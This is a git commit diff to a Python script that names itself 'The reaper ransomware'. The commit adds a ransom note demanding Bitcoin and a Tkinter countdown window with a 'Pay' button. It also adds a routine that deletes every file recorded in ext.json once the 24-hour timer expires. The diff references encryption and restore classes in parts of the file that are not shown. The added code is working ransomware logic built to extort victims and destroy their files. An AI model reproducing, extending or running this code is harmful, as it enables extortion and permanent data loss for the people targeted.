fdf6a21e1831ed85ea0d6f868fc3b78b750a9ccb
IVBecy <57770911+IVBecy@users.noreply.github.com>
2021-01-28 16:25:27 +0000

    Added GUI

--- reaper.py
+++ reaper.py
@@ -1,11 +1,10 @@
 # The reaper ransomware 8========D
 from cryptography.fernet import Fernet
-import os
-import sys
-import json
+import os,sys,json,time
+from tkinter import *
 
 # Variables
-DIR = "C:/Users/krist/Documents/ran_test"
+DIR = "C:/Users/krist/Documents/beatmaker"
 dirs = []
 COLORS = {
   "hacker_green": "\033[1;32;40m",
@@ -26,6 +25,16 @@ banner = f"""
                               | $$                          
                               |__/                          
 {COLORS["white"]}"""
+RANSOM_TEXT = """ 
+This is the REAPER ransomware.
+
+Pay for the ransom to be removed.
+The payment must be in Bitcoin.
+Once you paid all files will be back to normal.
+If instructions are not followed all files will be deleted.
+
+Click on 'Pay' and follow the instructions.
+"""
 
 # The file rewriting class
 class TakeOver():
@@ -106,11 +115,61 @@ class TakeBack():
         pass
     print("Files are back to normal, REAPER is quitting...")
     os.remove("ext.json")
-      
+
+# Class for the countdown timer window
+class TimerWindow():
+  def __init__(self): 
+    # Max time to pay ransom
+    self.secs = 86400
+    # Window
+    self.root = Tk()
+    self.root.resizable(False,False)
+    self.root.geometry("700x700")
+    self.root.title("REAPER - COUNTDOWN")
+    self.root.configure(bg="black")
+    # Reaper text
+    rpr_label = Label(self.root, text="\nREAPER", fg="#00FF00",bg="black", font=("Courier", 60,))
+    rpr_label.pack()
+    # Countdown timer
+    self.c_time = StringVar()
+    self.c_time.set(self.secs)
+    self.timer = Label(self.root, textvariable=self.c_time,bg="black", fg="#00FF00", font=("Courier", 25))
+    self.timer.pack()
+    # Bitcoin button
+    pay_btc_btn = Button(self.root, text="Pay", fg="#00FF00",bg="#404040", font=("Courier", 20))
+    pay_btc_btn .pack()
+    # Explanation
+    exp = Label(self.root, text=RANSOM_TEXT, fg="#00FF00",bg="black", font=("Courier", 12,), anchor='center')
+    exp.pack()
+
+  # Method to decrease timer
+  def decrease_time(self):
+    if self.secs == 0:
+      self.delete_all_files()
+    else:
+      self.secs -= 1
+      self.time_left = f"Time left:\n{self.secs//3600}:{self.secs%3600//60}:{self.secs%3600%60}\n"
+      self.c_time.set(self.time_left)
+      self.root.after(1000, self.decrease_time)
+
+  # Method to delete all files
+  def delete_all_files(self):
+    print(f"{COLORS['red']}No ransom was paid, deleting files...{COLORS['white']}")
+    with open("ext.json") as files:
+      self.files = json.load(files)
+    for i in self.files:
+      os.remove(i)
+      print(f"Deleting: {i}")
+    os.remove("ext.json")
+    sys.exit()
+
 if sys.argv[1] == "-t":
   REAPER = TakeOver()
 elif sys.argv[1] == "-r":
   TAKER = TakeBack()
 else:
+  t = TimerWindow()
+  t.decrease_time()
+  t.root.mainloop()
   print("Wrong parameters...")
-  sys.exit()
+  #sys.exit()
